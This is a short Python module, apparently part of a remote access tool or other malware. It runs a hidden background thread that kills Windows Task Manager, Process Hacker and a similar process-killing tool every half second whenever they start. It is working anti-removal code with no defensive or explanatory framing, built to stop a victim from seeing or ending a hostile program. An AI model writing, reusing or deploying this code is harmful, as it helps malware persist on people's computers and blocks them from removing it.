import os, time, threading

_antitaskmgr_active = False

def _atm_loop():
    import psutil
    while _antitaskmgr_active:
        try:
            for p in psutil.process_iter(["name"]):
                if p.info["name"].lower() in ["taskmgr.exe", "processhacker.exe", "pckiller.exe"]:
                    p.kill()
        except: pass
        time.sleep(0.5)

def start_antitaskmgr():
    global _antitaskmgr_active
    if not _antitaskmgr_active:
        _antitaskmgr_active = True
        threading.Thread(target=_atm_loop, daemon=True).start()

def stop_antitaskmgr():
    global _antitaskmgr_active
    _antitaskmgr_active = False
